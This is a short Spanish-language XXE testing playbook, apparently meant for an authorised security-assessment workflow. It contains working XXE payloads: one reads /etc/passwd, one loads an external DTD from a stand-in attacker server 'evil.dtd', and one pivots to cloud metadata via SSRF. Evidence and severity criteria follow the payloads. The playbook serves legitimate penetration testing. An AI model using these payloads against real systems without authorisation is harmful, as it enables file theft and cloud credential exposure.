# Playbook: XXE (XML External Entity)

1. **Identificar endpoints que procesan XML**: APIs SOAP, uploads de `.docx`/
   `.xlsx`/`.svg` (son ZIPs con XML adentro), cualquier `Content-Type:
   application/xml` o `text/xml`, feeds RSS que el server parsea.
2. **Clásico (lectura de archivo)**: inyectar una entidad externa que lea un
   archivo local y la referencia en el cuerpo de la respuesta:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
   <foo>&xxe;</foo>
   ```
   Si el contenido de `/etc/passwd` aparece reflejado en la respuesta, confirmado.
3. **Blind/OOB (si no hay reflejo directo)**: entidad externa apuntando a un
   servidor propio, o external DTD con `interactsh`:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://tu-servidor/evil.dtd"> %xxe;]>
   ```
   Un hit en tu listener confirma el parseo de la entidad externa (blind XXE).
4. **XXE → SSRF**: la entidad externa puede apuntar a un recurso interno
   (`http://169.254.169.254/...`) en vez de un archivo — combina con `ssrf.md`
   para la escalada a metadata de cloud si aplica.
5. **Vía uploads de Office/SVG**: un `.docx`/`.xlsx` es un ZIP; el XML interno
   (`word/document.xml` o similar) puede llevar el payload. Un SVG subido y
   luego renderizado por el server también puede parsear XXE si usa un parser
   vulnerable.

**Evidencia mínima para `add_finding`:** el payload XML completo enviado, y (a)
el contenido del archivo leído en la respuesta, o (b) el callback OOB recibido.

**Criterio de severidad:** critical si permite leer archivos sensibles del
sistema (claves, config con credenciales) o escala a SSRF con acceso a
metadata cloud; high si confirmado pero limitado a archivos de bajo valor;
medium si es blind sin poder demostrar qué se puede leer.
